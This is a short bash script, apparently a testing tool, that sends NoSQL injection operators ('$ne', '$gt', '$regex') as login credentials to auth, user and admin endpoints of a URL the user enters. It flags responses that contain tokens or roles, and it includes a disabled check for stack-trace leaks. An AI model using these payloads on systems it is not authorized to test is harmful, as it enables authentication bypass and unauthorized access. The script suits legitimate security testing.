#!/bin/bash

read -p "Enter a base URL :: " base_url

endpoints=("/api/auth/signin" "/api/auth/signup" "/api/user/profile/" "/api/admin/dashboard" "/api/users" "/api/public/user")
query=('{"$ne":""}' '{"$gt":""}' '{"$regex":".*"}')

NOSQL_inj() {
    local url=$1

    for endpoint in "${endpoints[@]}"; do
        for qry in "${query[@]}"; do



            
            response_file=$(mktemp)
            
            STATUS=$(curl -s -o "$response_file" -w "%{http_code}" -X POST \
                -H "Content-Type: application/json" \
                -d "{\"name\": ${qry}, \"password\": ${qry}}" \
                "${url}${endpoint}")



            
            injection=$(cat "$response_file")
            rm -f "$response_file"




            echo "URL :: ${url}${endpoint} [Payload: $qry]"


            echo "Status :: $STATUS"

            if [ "$STATUS" -eq 404 ] || [ "$STATUS" -eq 405 ]; then
                echo "[-] Endpoint not found or method not allowed (Skipped)"
            elif [ "$STATUS" -eq 200 ]; then
                if echo "$injection" | grep -qE "token|success.*true|_id|role"; then
                    echo "[!] POTENTIAL VULNERABILITY: $endpoint returned 200 with sensitive data!"


                else
                    echo "[+] Status 200, but safe response."
                fi
            else
                echo "[+] Secure (Status: $STATUS)"
            fi



            echo "-----------------------------------------------------------"
        done
    done
}

malformed_test() {
    local url=$1

    for endpoint in "${endpoints[@]}"; do
        response_file=$(mktemp)
        
        STATUS=$(curl -s -o "$response_file" -w "%{http_code}" -X POST -H "Content-Type: application/json" -d 'malformed-json-not-valid' "${url}${endpoint}")
        
        malformed_body=$(cat "$response_file")
        rm -f "$response_file"

        echo "Testing malformed JSON on :: ${url}${endpoint} (Status: $STATUS)"

        if echo "$malformed_body" | grep -qE "SyntaxError|at |\.js:|node_modules|Internal Server Error"; then
            echo "[!] VULNERABILITY: Internal paths or stack trace leaking at $endpoint!"
        else
            echo "[+] Safe handling (No stack trace leaked)."
        fi
        echo "-----------------------------------------------------------"
    done
}

cleanup() {
    echo "=========================================================="
    echo "Starting NoSQL Injection Scan..."
    echo "=========================================================="
    NOSQL_inj "$base_url"


    echo "=========================================================="
    echo "Starting Malformed JSON  Error Leak Scan"



    echo "=========================================================="
#    malformed_test "$base_url"
    echo "=========================================================="
}

cleanup



